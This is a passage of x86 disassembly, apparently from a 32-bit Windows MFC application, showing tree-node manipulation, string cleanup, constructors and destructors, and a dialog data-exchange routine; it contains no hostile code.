  401d34:	8b 51 08             	mov    0x8(%ecx),%edx
  401d37:	3b 15 cc 43 45 00    	cmp    0x4543cc,%edx
  401d3d:	74 03                	je     0x401d42
  401d3f:	89 42 04             	mov    %eax,0x4(%edx)
  401d42:	8b 50 04             	mov    0x4(%eax),%edx
  401d45:	89 51 04             	mov    %edx,0x4(%ecx)
  401d48:	8b 55 04             	mov    0x4(%ebp),%edx
  401d4b:	3b 42 04             	cmp    0x4(%edx),%eax
  401d4e:	75 05                	jne    0x401d55
  401d50:	89 4a 04             	mov    %ecx,0x4(%edx)
  401d53:	eb 0f                	jmp    0x401d64
  401d55:	8b 50 04             	mov    0x4(%eax),%edx
  401d58:	3b 42 08             	cmp    0x8(%edx),%eax
  401d5b:	75 05                	jne    0x401d62
  401d5d:	89 4a 08             	mov    %ecx,0x8(%edx)
  401d60:	eb 02                	jmp    0x401d64
  401d62:	89 0a                	mov    %ecx,(%edx)
  401d64:	89 41 08             	mov    %eax,0x8(%ecx)
  401d67:	89 48 04             	mov    %ecx,0x4(%eax)
  401d6a:	89 7e 2c             	mov    %edi,0x2c(%esi)
  401d6d:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  401d71:	ff 15 a0 62 40 00    	call   *0x4062a0
  401d77:	8b 74 24 14          	mov    0x14(%esp),%esi
  401d7b:	8b 46 20             	mov    0x20(%esi),%eax
  401d7e:	3b c3                	cmp    %ebx,%eax
  401d80:	74 1d                	je     0x401d9f
  401d82:	8d 48 ff             	lea    -0x1(%eax),%ecx
  401d85:	8a 40 ff             	mov    -0x1(%eax),%al
  401d88:	3a c3                	cmp    %bl,%al
  401d8a:	74 0a                	je     0x401d96
  401d8c:	3c ff                	cmp    $0xff,%al
  401d8e:	74 06                	je     0x401d96
  401d90:	fe c8                	dec    %al
  401d92:	88 01                	mov    %al,(%ecx)
  401d94:	eb 09                	jmp    0x401d9f
  401d96:	51                   	push   %ecx
  401d97:	e8 86 28 00 00       	call   0x404622
  401d9c:	83 c4 04             	add    $0x4,%esp
  401d9f:	89 5e 20             	mov    %ebx,0x20(%esi)
  401da2:	89 5e 24             	mov    %ebx,0x24(%esi)
  401da5:	89 5e 28             	mov    %ebx,0x28(%esi)
  401da8:	8b 46 10             	mov    0x10(%esi),%eax
  401dab:	3b c3                	cmp    %ebx,%eax
  401dad:	74 1d                	je     0x401dcc
  401daf:	8d 48 ff             	lea    -0x1(%eax),%ecx
  401db2:	8a 40 ff             	mov    -0x1(%eax),%al
  401db5:	3a c3                	cmp    %bl,%al
  401db7:	74 0a                	je     0x401dc3
  401db9:	3c ff                	cmp    $0xff,%al
  401dbb:	74 06                	je     0x401dc3
  401dbd:	fe c8                	dec    %al
  401dbf:	88 01                	mov    %al,(%ecx)
  401dc1:	eb 09                	jmp    0x401dcc
  401dc3:	51                   	push   %ecx
  401dc4:	e8 59 28 00 00       	call   0x404622
  401dc9:	83 c4 04             	add    $0x4,%esp
  401dcc:	56                   	push   %esi
  401dcd:	89 5e 10             	mov    %ebx,0x10(%esi)
  401dd0:	89 5e 14             	mov    %ebx,0x14(%esi)
  401dd3:	89 5e 18             	mov    %ebx,0x18(%esi)
  401dd6:	e8 47 28 00 00       	call   0x404622
  401ddb:	8b 45 0c             	mov    0xc(%ebp),%eax
  401dde:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  401de2:	83 c4 04             	add    $0x4,%esp
  401de5:	48                   	dec    %eax
  401de6:	89 45 0c             	mov    %eax,0xc(%ebp)
  401de9:	8b 44 24 24          	mov    0x24(%esp),%eax
  401ded:	5f                   	pop    %edi
  401dee:	5e                   	pop    %esi
  401def:	5d                   	pop    %ebp
  401df0:	89 08                	mov    %ecx,(%eax)
  401df2:	5b                   	pop    %ebx
  401df3:	83 c4 10             	add    $0x10,%esp
  401df6:	c2 08 00             	ret    $0x8
  401df9:	90                   	nop
  401dfa:	90                   	nop
  401dfb:	90                   	nop
  401dfc:	90                   	nop
  401dfd:	90                   	nop
  401dfe:	90                   	nop
  401dff:	90                   	nop
  401e00:	a1 cc 43 45 00       	mov    0x4543cc,%eax
  401e05:	53                   	push   %ebx
  401e06:	56                   	push   %esi
  401e07:	57                   	push   %edi
  401e08:	8b 7c 24 10          	mov    0x10(%esp),%edi
  401e0c:	8b d9                	mov    %ecx,%ebx
  401e0e:	3b f8                	cmp    %eax,%edi
  401e10:	8b f7                	mov    %edi,%esi
  401e12:	74 29                	je     0x401e3d
  401e14:	8b 46 08             	mov    0x8(%esi),%eax
  401e17:	8b cb                	mov    %ebx,%ecx
  401e19:	50                   	push   %eax
  401e1a:	e8 e1 ff ff ff       	call   0x401e00
  401e1f:	8b 36                	mov    (%esi),%esi
  401e21:	8d 4f 0c             	lea    0xc(%edi),%ecx
  401e24:	e8 b7 00 00 00       	call   0x401ee0
  401e29:	57                   	push   %edi
  401e2a:	e8 f3 27 00 00       	call   0x404622
  401e2f:	a1 cc 43 45 00       	mov    0x4543cc,%eax
  401e34:	83 c4 04             	add    $0x4,%esp
  401e37:	3b f0                	cmp    %eax,%esi
  401e39:	8b fe                	mov    %esi,%edi
  401e3b:	75 d7                	jne    0x401e14
  401e3d:	5f                   	pop    %edi
  401e3e:	5e                   	pop    %esi
  401e3f:	5b                   	pop    %ebx
  401e40:	c2 04 00             	ret    $0x4
  401e43:	90                   	nop
  401e44:	90                   	nop
  401e45:	90                   	nop
  401e46:	90                   	nop
  401e47:	90                   	nop
  401e48:	90                   	nop
  401e49:	90                   	nop
  401e4a:	90                   	nop
  401e4b:	90                   	nop
  401e4c:	90                   	nop
  401e4d:	90                   	nop
  401e4e:	90                   	nop
  401e4f:	90                   	nop
  401e50:	56                   	push   %esi
  401e51:	8b f1                	mov    %ecx,%esi
  401e53:	e8 42 28 00 00       	call   0x40469a
  401e58:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  401e5d:	74 09                	je     0x401e68
  401e5f:	56                   	push   %esi
  401e60:	e8 bd 27 00 00       	call   0x404622
  401e65:	83 c4 04             	add    $0x4,%esp
  401e68:	8b c6                	mov    %esi,%eax
  401e6a:	5e                   	pop    %esi
  401e6b:	c2 04 00             	ret    $0x4
  401e6e:	90                   	nop
  401e6f:	90                   	nop
  401e70:	8b 01                	mov    (%ecx),%eax
  401e72:	56                   	push   %esi
  401e73:	8b 35 cc 43 45 00    	mov    0x4543cc,%esi
  401e79:	8b 50 08             	mov    0x8(%eax),%edx
  401e7c:	3b d6                	cmp    %esi,%edx
  401e7e:	74 12                	je     0x401e92
  401e80:	8b 02                	mov    (%edx),%eax
  401e82:	3b c6                	cmp    %esi,%eax
  401e84:	74 08                	je     0x401e8e
  401e86:	8b d0                	mov    %eax,%edx
  401e88:	8b 02                	mov    (%edx),%eax
  401e8a:	3b c6                	cmp    %esi,%eax
  401e8c:	75 f8                	jne    0x401e86
  401e8e:	89 11                	mov    %edx,(%ecx)
  401e90:	5e                   	pop    %esi
  401e91:	c3                   	ret
  401e92:	8b 40 04             	mov    0x4(%eax),%eax
  401e95:	8b 11                	mov    (%ecx),%edx
  401e97:	3b 50 08             	cmp    0x8(%eax),%edx
  401e9a:	75 0c                	jne    0x401ea8
  401e9c:	89 01                	mov    %eax,(%ecx)
  401e9e:	8b 40 04             	mov    0x4(%eax),%eax
  401ea1:	8b 11                	mov    (%ecx),%edx
  401ea3:	3b 50 08             	cmp    0x8(%eax),%edx
  401ea6:	74 f4                	je     0x401e9c
  401ea8:	8b 11                	mov    (%ecx),%edx
  401eaa:	39 42 08             	cmp    %eax,0x8(%edx)
  401ead:	74 02                	je     0x401eb1
  401eaf:	89 01                	mov    %eax,(%ecx)
  401eb1:	5e                   	pop    %esi
  401eb2:	c3                   	ret
  401eb3:	90                   	nop
  401eb4:	90                   	nop
  401eb5:	90                   	nop
  401eb6:	90                   	nop
  401eb7:	90                   	nop
  401eb8:	90                   	nop
  401eb9:	90                   	nop
  401eba:	90                   	nop
  401ebb:	90                   	nop
  401ebc:	90                   	nop
  401ebd:	90                   	nop
  401ebe:	90                   	nop
  401ebf:	90                   	nop
  401ec0:	56                   	push   %esi
  401ec1:	8b f1                	mov    %ecx,%esi
  401ec3:	e8 18 00 00 00       	call   0x401ee0
  401ec8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  401ecd:	74 09                	je     0x401ed8
  401ecf:	56                   	push   %esi
  401ed0:	e8 4d 27 00 00       	call   0x404622
  401ed5:	83 c4 04             	add    $0x4,%esp
  401ed8:	8b c6                	mov    %esi,%eax
  401eda:	5e                   	pop    %esi
  401edb:	c2 04 00             	ret    $0x4
  401ede:	90                   	nop
  401edf:	90                   	nop
  401ee0:	53                   	push   %ebx
  401ee1:	56                   	push   %esi
  401ee2:	8b f1                	mov    %ecx,%esi
  401ee4:	33 db                	xor    %ebx,%ebx
  401ee6:	8b 46 14             	mov    0x14(%esi),%eax
  401ee9:	3b c3                	cmp    %ebx,%eax
  401eeb:	74 1d                	je     0x401f0a
  401eed:	8d 48 ff             	lea    -0x1(%eax),%ecx
  401ef0:	8a 40 ff             	mov    -0x1(%eax),%al
  401ef3:	3a c3                	cmp    %bl,%al
  401ef5:	74 0a                	je     0x401f01
  401ef7:	3c ff                	cmp    $0xff,%al
  401ef9:	74 06                	je     0x401f01
  401efb:	fe c8                	dec    %al
  401efd:	88 01                	mov    %al,(%ecx)
  401eff:	eb 09                	jmp    0x401f0a
  401f01:	51                   	push   %ecx
  401f02:	e8 1b 27 00 00       	call   0x404622
  401f07:	83 c4 04             	add    $0x4,%esp
  401f0a:	89 5e 14             	mov    %ebx,0x14(%esi)
  401f0d:	89 5e 18             	mov    %ebx,0x18(%esi)
  401f10:	89 5e 1c             	mov    %ebx,0x1c(%esi)
  401f13:	8b 46 04             	mov    0x4(%esi),%eax
  401f16:	3b c3                	cmp    %ebx,%eax
  401f18:	74 27                	je     0x401f41
  401f1a:	8d 48 ff             	lea    -0x1(%eax),%ecx
  401f1d:	8a 40 ff             	mov    -0x1(%eax),%al
  401f20:	3a c3                	cmp    %bl,%al
  401f22:	74 14                	je     0x401f38
  401f24:	3c ff                	cmp    $0xff,%al
  401f26:	74 10                	je     0x401f38
  401f28:	fe c8                	dec    %al
  401f2a:	88 01                	mov    %al,(%ecx)
  401f2c:	89 5e 04             	mov    %ebx,0x4(%esi)
  401f2f:	89 5e 08             	mov    %ebx,0x8(%esi)
  401f32:	89 5e 0c             	mov    %ebx,0xc(%esi)
  401f35:	5e                   	pop    %esi
  401f36:	5b                   	pop    %ebx
  401f37:	c3                   	ret
  401f38:	51                   	push   %ecx
  401f39:	e8 e4 26 00 00       	call   0x404622
  401f3e:	83 c4 04             	add    $0x4,%esp
  401f41:	89 5e 04             	mov    %ebx,0x4(%esi)
  401f44:	89 5e 08             	mov    %ebx,0x8(%esi)
  401f47:	89 5e 0c             	mov    %ebx,0xc(%esi)
  401f4a:	5e                   	pop    %esi
  401f4b:	5b                   	pop    %ebx
  401f4c:	c3                   	ret
  401f4d:	90                   	nop
  401f4e:	90                   	nop
  401f4f:	90                   	nop
  401f50:	56                   	push   %esi
  401f51:	8b f1                	mov    %ecx,%esi
  401f53:	e8 3c 27 00 00       	call   0x404694
  401f58:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  401f5d:	74 09                	je     0x401f68
  401f5f:	56                   	push   %esi
  401f60:	e8 bd 26 00 00       	call   0x404622
  401f65:	83 c4 04             	add    $0x4,%esp
  401f68:	8b c6                	mov    %esi,%eax
  401f6a:	5e                   	pop    %esi
  401f6b:	c2 04 00             	ret    $0x4
  401f6e:	90                   	nop
  401f6f:	90                   	nop
  401f70:	6a ff                	push   $0xffffffff
  401f72:	68 ad 4d 40 00       	push   $0x404dad
  401f77:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401f7d:	50                   	push   %eax
  401f7e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401f85:	51                   	push   %ecx
  401f86:	8b 44 24 14          	mov    0x14(%esp),%eax
  401f8a:	53                   	push   %ebx
  401f8b:	56                   	push   %esi
  401f8c:	57                   	push   %edi
  401f8d:	8b f1                	mov    %ecx,%esi
  401f8f:	50                   	push   %eax
  401f90:	68 89 00 00 00       	push   $0x89
  401f95:	89 74 24 14          	mov    %esi,0x14(%esp)
  401f99:	e8 7e 26 00 00       	call   0x40461c
  401f9e:	8d 7e 60             	lea    0x60(%esi),%edi
  401fa1:	33 db                	xor    %ebx,%ebx
  401fa3:	8b cf                	mov    %edi,%ecx
  401fa5:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  401fa9:	e8 f2 26 00 00       	call   0x4046a0
  401fae:	c7 07 d0 65 40 00    	movl   $0x4065d0,(%edi)
  401fb4:	8d be a0 00 00 00    	lea    0xa0(%esi),%edi
  401fba:	c6 44 24 18 01       	movb   $0x1,0x18(%esp)
  401fbf:	8b cf                	mov    %edi,%ecx
  401fc1:	e8 50 26 00 00       	call   0x404616
  401fc6:	89 9e b0 00 00 00    	mov    %ebx,0xb0(%esi)
  401fcc:	8d 8e b4 00 00 00    	lea    0xb4(%esi),%ecx
  401fd2:	c6 44 24 18 03       	movb   $0x3,0x18(%esp)
  401fd7:	e8 3a 26 00 00       	call   0x404616
  401fdc:	68 b0 43 45 00       	push   $0x4543b0
  401fe1:	8b cf                	mov    %edi,%ecx
  401fe3:	c6 44 24 1c 04       	movb   $0x4,0x1c(%esp)
  401fe8:	c7 06 a0 67 40 00    	movl   $0x4067a0,(%esi)
  401fee:	e8 1d 26 00 00       	call   0x404610
  401ff3:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401ff7:	89 9e a4 00 00 00    	mov    %ebx,0xa4(%esi)
  401ffd:	89 9e a8 00 00 00    	mov    %ebx,0xa8(%esi)
  402003:	89 9e ac 00 00 00    	mov    %ebx,0xac(%esi)
  402009:	8b c6                	mov    %esi,%eax
  40200b:	5f                   	pop    %edi
  40200c:	5e                   	pop    %esi
  40200d:	5b                   	pop    %ebx
  40200e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402015:	83 c4 10             	add    $0x10,%esp
  402018:	c2 04 00             	ret    $0x4
  40201b:	90                   	nop
  40201c:	90                   	nop
  40201d:	90                   	nop
  40201e:	90                   	nop
  40201f:	90                   	nop
  402020:	56                   	push   %esi
  402021:	8b f1                	mov    %ecx,%esi
  402023:	e8 18 00 00 00       	call   0x402040
  402028:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40202d:	74 09                	je     0x402038
  40202f:	56                   	push   %esi
  402030:	e8 ed 25 00 00       	call   0x404622
  402035:	83 c4 04             	add    $0x4,%esp
  402038:	8b c6                	mov    %esi,%eax
  40203a:	5e                   	pop    %esi
  40203b:	c2 04 00             	ret    $0x4
  40203e:	90                   	nop
  40203f:	90                   	nop
  402040:	6a ff                	push   $0xffffffff
  402042:	68 ef 4d 40 00       	push   $0x404def
  402047:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40204d:	50                   	push   %eax
  40204e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402055:	51                   	push   %ecx
  402056:	56                   	push   %esi
  402057:	8b f1                	mov    %ecx,%esi
  402059:	89 74 24 04          	mov    %esi,0x4(%esp)
  40205d:	8d 8e b4 00 00 00    	lea    0xb4(%esi),%ecx
  402063:	c7 44 24 10 03 00 00 	movl   $0x3,0x10(%esp)
  40206a:	00 
  40206b:	e8 94 25 00 00       	call   0x404604
  402070:	8b 86 b0 00 00 00    	mov    0xb0(%esi),%eax
  402076:	c6 44 24 10 02       	movb   $0x2,0x10(%esp)
  40207b:	85 c0                	test   %eax,%eax
  40207d:	74 06                	je     0x402085
  40207f:	8b 08                	mov    (%eax),%ecx
  402081:	50                   	push   %eax
  402082:	ff 51 08             	call   *0x8(%ecx)
  402085:	8d 8e a0 00 00 00    	lea    0xa0(%esi),%ecx
  40208b:	c6 44 24 10 01       	movb   $0x1,0x10(%esp)
  402090:	e8 6f 25 00 00       	call   0x404604
  402095:	8d 4e 60             	lea    0x60(%esi),%ecx
  402098:	c6 44 24 10 00       	movb   $0x0,0x10(%esp)
  40209d:	e8 f2 25 00 00       	call   0x404694
  4020a2:	8b ce                	mov    %esi,%ecx
  4020a4:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  4020ab:	ff 
  4020ac:	e8 59 25 00 00       	call   0x40460a
  4020b1:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4020b5:	5e                   	pop    %esi
  4020b6:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4020bd:	83 c4 10             	add    $0x10,%esp
  4020c0:	c3                   	ret
  4020c1:	90                   	nop
  4020c2:	90                   	nop
  4020c3:	90                   	nop
  4020c4:	90                   	nop
  4020c5:	90                   	nop
  4020c6:	90                   	nop
  4020c7:	90                   	nop
  4020c8:	90                   	nop
  4020c9:	90                   	nop
  4020ca:	90                   	nop
  4020cb:	90                   	nop
  4020cc:	90                   	nop
  4020cd:	90                   	nop
  4020ce:	90                   	nop
  4020cf:	90                   	nop
  4020d0:	56                   	push   %esi
  4020d1:	8b f1                	mov    %ecx,%esi
  4020d3:	57                   	push   %edi
  4020d4:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  4020d8:	8d 46 60             	lea    0x60(%esi),%eax
  4020db:	50                   	push   %eax
  4020dc:	68 33 04 00 00       	push   $0x433
  4020e1:	57                   	push   %edi
  4020e2:	e8 c5 25 00 00       	call   0x4046ac
  4020e7:	8d 8e a0 00 00 00    	lea    0xa0(%esi),%ecx
  4020ed:	51                   	push   %ecx
  4020ee:	68 43 04 00 00       	push   $0x443
  4020f3:	57                   	push   %edi
  4020f4:	e8 3b 25 00 00       	call   0x404634
  4020f9:	8d 96 a4 00 00 00    	lea    0xa4(%esi),%edx
  4020ff:	52                   	push   %edx
  402100:	68 41 04 00 00       	push   $0x441
  402105:	57                   	push   %edi
  402106:	e8 23 25 00 00       	call   0x40462e
  40210b:	8d 86 a8 00 00 00    	lea    0xa8(%esi),%eax
  402111:	50                   	push   %eax
  402112:	68 40 04 00 00       	push   $0x440
  402117:	57                   	push   %edi
  402118:	e8 11 25 00 00       	call   0x40462e
  40211d:	81 c6 ac 00 00 00    	add    $0xac,%esi
  402123:	56                   	push   %esi
  402124:	68 42 04 00 00       	push   $0x442
  402129:	57                   	push   %edi
  40212a:	e8 77 25 00 00       	call   0x4046a6
  40212f:	5f                   	pop    %edi
  402130:	5e                   	pop    %esi
  402131:	c2 04 00             	ret    $0x4
  402134:	90                   	nop
  402135:	90                   	nop
  402136:	90                   	nop
  402137:	90                   	nop
  402138:	90                   	nop
  402139:	90                   	nop
  40213a:	90                   	nop
  40213b:	90                   	nop
  40213c:	90                   	nop
  40213d:	90                   	nop
  40213e:	90                   	nop
  40213f:	90                   	nop
  402140:	b8 68 67 40 00       	mov    $0x406768,%eax
  402145:	c3                   	ret
  402146:	90                   	nop
  402147:	90                   	nop
  402148:	90                   	nop
  402149:	90                   	nop
  40214a:	90                   	nop
  40214b:	90                   	nop
  40214c:	90                   	nop
  40214d:	90                   	nop
  40214e:	90                   	nop
  40214f:	90                   	nop
  402150:	6a ff                	push   $0xffffffff
  402152:	68 0a 4e 40 00       	push   $0x404e0a
  402157:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40215d:	50                   	push   %eax
  40215e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402165:	51                   	push   %ecx
  402166:	6a 24                	push   $0x24
  402168:	e8 6f 25 00 00       	call   0x4046dc
  40216d:	83 c4 04             	add    $0x4,%esp
  402170:	89 44 24 00          	mov    %eax,0x0(%esp)
  402174:	85 c0                	test   %eax,%eax
  402176:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  40217d:	00 
  40217e:	74 16                	je     0x402196
  402180:	8b c8                	mov    %eax,%ecx
  402182:	e8 49 00 00 00       	call   0x4021d0
  402187:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40218b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402192:	83 c4 10             	add    $0x10,%esp
  402195:	c3                   	ret
  402196:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40219a:	33 c0                	xor    %eax,%eax
  40219c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4021a3:	83 c4 10             	add    $0x10,%esp
  4021a6:	c3                   	ret
  4021a7:	90                   	nop
  4021a8:	90                   	nop
  4021a9:	90                   	nop
  4021aa:	90                   	nop
  4021ab:	90                   	nop
  4021ac:	90                   	nop
  4021ad:	90                   	nop
  4021ae:	90                   	nop
  4021af:	90                   	nop
  4021b0:	a1 70 62 40 00       	mov    0x406270,%eax
  4021b5:	c3                   	ret
  4021b6:	90                   	nop
  4021b7:	90                   	nop
  4021b8:	90                   	nop
  4021b9:	90                   	nop
  4021ba:	90                   	nop
  4021bb:	90                   	nop
  4021bc:	90                   	nop
  4021bd:	90                   	nop
  4021be:	90                   	nop
  4021bf:	90                   	nop
  4021c0:	b8 98 68 40 00       	mov    $0x406898,%eax
  4021c5:	c3                   	ret
  4021c6:	90                   	nop
  4021c7:	90                   	nop
  4021c8:	90                   	nop
  4021c9:	90                   	nop
  4021ca:	90                   	nop
  4021cb:	90                   	nop
  4021cc:	90                   	nop
  4021cd:	90                   	nop
  4021ce:	90                   	nop
  4021cf:	90                   	nop
  4021d0:	56                   	push   %esi
  4021d1:	8b f1                	mov    %ecx,%esi
  4021d3:	e8 0a 25 00 00       	call   0x4046e2
  4021d8:	c7 06 20 69 40 00    	movl   $0x406920,(%esi)
  4021de:	8b c6                	mov    %esi,%eax
  4021e0:	5e                   	pop    %esi
  4021e1:	c3                   	ret
  4021e2:	90                   	nop
  4021e3:	90                   	nop
  4021e4:	90                   	nop
  4021e5:	90                   	nop
  4021e6:	90                   	nop
  4021e7:	90                   	nop
  4021e8:	90                   	nop
  4021e9:	90                   	nop
  4021ea:	90                   	nop
  4021eb:	90                   	nop
  4021ec:	90                   	nop
  4021ed:	90                   	nop
  4021ee:	90                   	nop
  4021ef:	90                   	nop
  4021f0:	56                   	push   %esi
  4021f1:	8b f1                	mov    %ecx,%esi
  4021f3:	e8 18 00 00 00       	call   0x402210
  4021f8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  4021fd:	74 09                	je     0x402208
  4021ff:	56                   	push   %esi
  402200:	e8 1d 24 00 00       	call   0x404622
  402205:	83 c4 04             	add    $0x4,%esp
  402208:	8b c6                	mov    %esi,%eax
  40220a:	5e                   	pop    %esi
  40220b:	c2 04 00             	ret    $0x4
  40220e:	90                   	nop
  40220f:	90                   	nop
  402210:	6a ff                	push   $0xffffffff
  402212:	68 28 4e 40 00       	push   $0x404e28
  402217:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40221d:	50                   	push   %eax
  40221e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402225:	51                   	push   %ecx
  402226:	56                   	push   %esi
  402227:	8b f1                	mov    %ecx,%esi
  402229:	89 74 24 04          	mov    %esi,0x4(%esp)
  40222d:	c7 06 20 69 40 00    	movl   $0x406920,(%esi)
  402233:	8b 46 20             	mov    0x20(%esi),%eax
  402236:	33 c9                	xor    %ecx,%ecx
  402238:	3b c1                	cmp    %ecx,%eax
  40223a:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  40223e:	74 03                	je     0x402243
  402240:	89 48 60             	mov    %ecx,0x60(%eax)
  402243:	e8 a6 24 00 00       	call   0x4046ee
  402248:	8b ce                	mov    %esi,%ecx
  40224a:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  402251:	ff 
  402252:	e8 91 24 00 00       	call   0x4046e8
  402257:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  40225b:	5e                   	pop    %esi
  40225c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402263:	83 c4 10             	add    $0x10,%esp
  402266:	c3                   	ret
  402267:	90                   	nop
  402268:	90                   	nop
  402269:	90                   	nop
  40226a:	90                   	nop
  40226b:	90                   	nop
  40226c:	90                   	nop
  40226d:	90                   	nop
  40226e:	90                   	nop
  40226f:	90                   	nop
  402270:	e9 7f 24 00 00       	jmp    0x4046f4
  402275:	90                   	nop
  402276:	90                   	nop
  402277:	90                   	nop
  402278:	90                   	nop
  402279:	90                   	nop
  40227a:	90                   	nop
  40227b:	90                   	nop
  40227c:	90                   	nop
  40227d:	90                   	nop
  40227e:	90                   	nop
  40227f:	90                   	nop
  402280:	a1 48 61 40 00       	mov    0x406148,%eax
  402285:	c3                   	ret
  402286:	90                   	nop
  402287:	90                   	nop
  402288:	90                   	nop
  402289:	90                   	nop
  40228a:	90                   	nop
  40228b:	90                   	nop
  40228c:	90                   	nop
  40228d:	90                   	nop
  40228e:	90                   	nop
  40228f:	90                   	nop
  402290:	b8 b0 68 40 00       	mov    $0x4068b0,%eax
  402295:	c3                   	ret
  402296:	90                   	nop
  402297:	90                   	nop
  402298:	90                   	nop
  402299:	90                   	nop
  40229a:	90                   	nop
  40229b:	90                   	nop
  40229c:	90                   	nop
  40229d:	90                   	nop
  40229e:	90                   	nop
  40229f:	90                   	nop
  4022a0:	a1 4c 61 40 00       	mov    0x40614c,%eax
  4022a5:	c3                   	ret
  4022a6:	90                   	nop
  4022a7:	90                   	nop
  4022a8:	90                   	nop
  4022a9:	90                   	nop
  4022aa:	90                   	nop
  4022ab:	90                   	nop
  4022ac:	90                   	nop
  4022ad:	90                   	nop
  4022ae:	90                   	nop
  4022af:	90                   	nop
  4022b0:	b8 d0 68 40 00       	mov    $0x4068d0,%eax
  4022b5:	c3                   	ret
  4022b6:	90                   	nop
  4022b7:	90                   	nop
  4022b8:	90                   	nop
  4022b9:	90                   	nop
  4022ba:	90                   	nop
  4022bb:	90                   	nop
  4022bc:	90                   	nop
  4022bd:	90                   	nop
  4022be:	90                   	nop
  4022bf:	90                   	nop
  4022c0:	a1 50 61 40 00       	mov    0x406150,%eax
  4022c5:	c3                   	ret
  4022c6:	90                   	nop
  4022c7:	90                   	nop
  4022c8:	90                   	nop
  4022c9:	90                   	nop
  4022ca:	90                   	nop
  4022cb:	90                   	nop
  4022cc:	90                   	nop
  4022cd:	90                   	nop
  4022ce:	90                   	nop
  4022cf:	90                   	nop
  4022d0:	b8 00 69 40 00       	mov    $0x406900,%eax
  4022d5:	c3                   	ret
  4022d6:	90                   	nop
  4022d7:	90                   	nop
  4022d8:	90                   	nop
  4022d9:	90                   	nop
  4022da:	90                   	nop
  4022db:	90                   	nop
  4022dc:	90                   	nop
  4022dd:	90                   	nop
  4022de:	90                   	nop
  4022df:	90                   	nop
  4022e0:	e8 0b 00 00 00       	call   0x4022f0
  4022e5:	e9 26 00 00 00       	jmp    0x402310
  4022ea:	90                   	nop
  4022eb:	90                   	nop
  4022ec:	90                   	nop
  4022ed:	90                   	nop
  4022ee:	90                   	nop
  4022ef:	90                   	nop
  4022f0:	68 5c 90 40 00       	push   $0x40905c
  4022f5:	6a 01                	push   $0x1
  4022f7:	68 98 68 40 00       	push   $0x406898
  4022fc:	68 10 69 40 00       	push   $0x406910
  402301:	b9 d8 43 45 00       	mov    $0x4543d8,%ecx
  402306:	e8 ef 23 00 00       	call   0x4046fa
  40230b:	c3                   	ret
  40230c:	90                   	nop
  40230d:	90                   	nop
  40230e:	90                   	nop
  40230f:	90                   	nop
  402310:	68 20 23 40 00       	push   $0x402320
  402315:	e8 42 25 00 00       	call   0x40485c
  40231a:	59                   	pop    %ecx
  40231b:	c3                   	ret
  40231c:	90                   	nop
  40231d:	90                   	nop
  40231e:	90                   	nop
  40231f:	90                   	nop
  402320:	8a 0d d0 43 45 00    	mov    0x4543d0,%cl
  402326:	b0 01                	mov    $0x1,%al
  402328:	84 c8                	test   %cl,%al
  40232a:	75 12                	jne    0x40233e
  40232c:	0a c8                	or     %al,%cl
  40232e:	88 0d d0 43 45 00    	mov    %cl,0x4543d0
  402334:	b9 d8 43 45 00       	mov    $0x4543d8,%ecx
  402339:	e9 c2 23 00 00       	jmp    0x404700
  40233e:	c3                   	ret
  40233f:	90                   	nop
  402340:	8b 44 24 04          	mov    0x4(%esp),%eax
  402344:	50                   	push   %eax
  402345:	e8 d8 22 00 00       	call   0x404622
  40234a:	59                   	pop    %ecx
  40234b:	c2 04 00             	ret    $0x4
  40234e:	90                   	nop
  40234f:	90                   	nop
  402350:	6a ff                	push   $0xffffffff
  402352:	68 99 4e 40 00       	push   $0x404e99
  402357:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40235d:	50                   	push   %eax
  40235e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402365:	51                   	push   %ecx
  402366:	8b 44 24 14          	mov    0x14(%esp),%eax
  40236a:	53                   	push   %ebx
  40236b:	55                   	push   %ebp
  40236c:	56                   	push   %esi
  40236d:	57                   	push   %edi
  40236e:	8b f1                	mov    %ecx,%esi
  402370:	50                   	push   %eax
  402371:	68 82 00 00 00       	push   $0x82
  402376:	89 74 24 18          	mov    %esi,0x18(%esp)
  40237a:	e8 9d 22 00 00       	call   0x40461c
  40237f:	8d 7e 60             	lea    0x60(%esi),%edi
  402382:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  402389:	00 
  40238a:	8b cf                	mov    %edi,%ecx
  40238c:	e8 0f 23 00 00       	call   0x4046a0
  402391:	c7 07 d0 65 40 00    	movl   $0x4065d0,(%edi)
  402397:	8d be a0 00 00 00    	lea    0xa0(%esi),%edi
  40239d:	c6 44 24 1c 01       	movb   $0x1,0x1c(%esp)
  4023a2:	8b cf                	mov    %edi,%ecx
  4023a4:	e8 6d 22 00 00       	call   0x404616
